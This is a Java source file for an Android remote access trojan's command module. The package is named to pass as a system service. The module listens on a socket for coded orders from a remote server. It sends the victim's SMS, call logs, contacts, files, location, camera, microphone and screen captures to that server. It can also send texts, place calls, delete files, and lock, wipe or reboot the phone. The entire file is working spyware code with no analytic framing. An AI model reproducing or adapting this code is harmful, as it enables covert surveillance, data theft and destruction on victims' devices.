package com.android.background.services;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.android.background.services.helpers.AppsListManager;
import com.android.background.services.helpers.CallsManager;
import com.android.background.services.helpers.CameraManager;
import com.android.background.services.helpers.ContactsManager;
import com.android.background.services.helpers.FileManager;
import com.android.background.services.helpers.LocManager;
import com.android.background.services.helpers.MicManager;
import com.android.background.services.helpers.SMSManager;
import com.android.background.services.helpers.ScreenManager;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static final long RECONNECT_DELAY_MS = 3000;
    private static int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;

    public static void startAsync(Context con) {
        context = con;
        reconnectAttempts = 0;
        sendReqWithRetry();
    }

    private static void sendReqWithRetry() {
        try {
            ioSocket = null;
            sendReq();
            reconnectAttempts = 0;
        } catch (Exception ex) {
            Log.e("ConnectionManager", "Failed to connect: " + ex.getMessage());
            if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
                reconnectAttempts++;
                // Linear backoff: 3s, 6s, 9s, ... up to 30s
                long delay = Math.min(RECONNECT_DELAY_MS * reconnectAttempts, 30000);
                new Handler(Looper.getMainLooper()).postDelayed(
                        ConnectionManager::sendReqWithRetry,
                        delay
                );
            } else {
                Log.e("ConnectionManager", "Max reconnect attempts reached. Giving up.");
            }
        }
    }


    public static void sendReq() {

        try {

            if (ioSocket != null)
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();


            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (ioSocket != null) {
                        ioSocket.emit("pong");
                    }
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (args == null || args.length == 0 || !(args[0] instanceof JSONObject)) return;
                        JSONObject data = (JSONObject) args[0];
                        String order = data.optString("order");
                        if (order.isEmpty()) return;

                        Log.d("order", order);

                        switch (order) {
                            case "x0000ca": {
                                String extra = data.optString("extra");
                                if ("camList".equals(extra))
                                    x0000ca(-1);
                                else if ("1".equals(extra))
                                    x0000ca(1);
                                else if ("0".equals(extra))
                                    x0000ca(0);
                                break;
                            }
                            case "x0000fm": {
                                String extra = data.optString("extra");
                                String path = data.optString("path");
                                if ("ls".equals(extra))
                                    x0000fm(0, path);
                                else if ("dl".equals(extra))
                                    x0000fm(1, path);
                                break;
                            }
                            case "x0000sm": {
                                String extra = data.optString("extra");
                                if ("ls".equals(extra))
                                    x0000sm(0, null, null);
                                else if ("sendSMS".equals(extra))
                                    x0000sm(1, data.optString("to"), data.optString("sms"));
                                break;
                            }
                            case "x0000cl":
                                x0000cl();
                                break;
                            case "x0000cn":
                                x0000cn();
                                break;
                            case "x0000mc":
                                x0000mc(data.optInt("sec", 10));
                                break;
                            case "x0000apps":
                                x0000apps();
                                break;
                            case "x0000lm":
                                x0000lm();
                                break;
                            case "x0000runApp":
                                x0000runApp(data.optString("extra"));
                                break;
                            case "x0000openUrl":
                                x0000openUrl(data.optString("url"));
                                break;
                            case "x0000deleteFF":
                                x0000deleteFF(data.optString("fileFolderPath"));
                                break;
                            case "x0000dm":
                                x0000dm(data.optString("number"));
                                break;
                            case "x0000lockDevice":
                                x0000lockDevice();
                                break;
                            case "x0000wipeDevice":
                                x0000wipeDevice();
                                break;
                            case "x0000rebootDevice":
                                x0000rebootDevice();
                                break;
                            case "x0000sc":
                                x0000sc();
                                break;
                        }
                    } catch (Exception e) {
                        Log.e("ConnectionManager", "Error handling order: " + e.getMessage());
                    }
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.e("ConnectionManager", "Socket connection error");
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d("ConnectionManager", "Socket disconnected. Will reconnect automatically.");
                }
            });

            ioSocket.connect();

        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    private static void x0000rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
                jsonObject.put("status", true);
                jsonObject.put("message", "Device rebooted successfully.");
            }
            else{
                jsonObject.put("status", false);
                jsonObject.put("message", "Device is below Android 7.0");
            }
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000rebootDevice", jsonObject);
    }

    private static void x0000wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.wipeData(1);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device wiped out successfully.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000wipeDevice", jsonObject);
    }

    private static void x0000lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
            MainActivity.devicePolicyManager.lockNow();
            jsonObject.put("status", true);
            jsonObject.put("message", "Device locked.");
        }
        else{
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit("x0000lockDevice", jsonObject);
    }

    private static void x0000dm(String number) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        try {

            Uri phoneNumber = Uri.parse("tel:"+number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put("status", true);
        }
        catch (Exception e){
            jsonObject.put("status", false);
            e.printStackTrace();
        }
        ioSocket.emit("x0000dm", jsonObject);
    }

    private static void x0000deleteFF(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()){
            try {
                FileUtils.forceDelete(file);
                jsonObject.put("status", true);
            }
            catch (Exception e) {
                jsonObject.put("status", false);
                e.printStackTrace();
            }
        }
        else if (file.isFile() && file.exists()){
            jsonObject.put("status", file.delete());
        }

        ioSocket.emit("x0000deleteFF", jsonObject);
    }


    private static void x0000openUrl(String url) {

        JSONObject jsonObject = new JSONObject();

        try{
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put("status", true);
        }
        catch (Exception e){
            try {
                jsonObject.put("status", false);
            } catch (JSONException jsonException) {
                jsonException.printStackTrace();
            }
            e.printStackTrace();

        }
        ioSocket.emit("x0000openUrl", jsonObject);
    }


    private static void x0000runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put("launchingStatus", true);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            context.startActivity(launchIntent);
        }
        else {
            try {
                jsonObject.put("launchingStatus", false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        ioSocket.emit("x0000runApp", jsonObject);
    }

    public static void x0000apps() {
        ioSocket.emit("x0000apps", AppsListManager.getAppLists(context));
    }

    public static void x0000ca(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null)
                ioSocket.emit("x0000ca", cameraList);
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void x0000fm(int req, String path) {
        if (req == 0)
            ioSocket.emit("x0000fm", FileManager.walk(path));
        else if (req == 1)
            FileManager.downloadFile(path);
    }


    public static void x0000sm(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit("x0000sm", SMSManager.getSMSList());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl() {
        ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
    }

    public static void x0000cn() {
        ioSocket.emit("x0000cn", ContactsManager.getContacts());
    }

    public static void x0000sc() {
        if (MainService.getScreenData() != null) {
            new ScreenManager(context).captureScreen(MainService.getScreenResultCode(), MainService.getScreenData());
        }
    }

    public static void x0000mc(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void x0000lm() {
        try {
            // Only prepare Looper if one doesn't already exist on this thread
            if (Looper.myLooper() == null) {
                Looper.prepare();
            }
            LocManager gps = new LocManager(context);
            JSONObject location = new JSONObject();
            // check if GPS enabled
            if (gps.canGetLocation()) {

                double latitude = gps.getLatitude();
                double longitude = gps.getLongitude();
                Log.d("Location", latitude + "   ,  " + longitude);
                location.put("enable", true);
                location.put("lat", latitude);
                location.put("lng", longitude);
            } else
                location.put("enable", false);

            if (ioSocket != null) {
                ioSocket.emit("x0000lm", location);
            }
        } catch (Exception e) {
            Log.e("ConnectionManager", "Error getting location: " + e.getMessage());
        }
    }
}
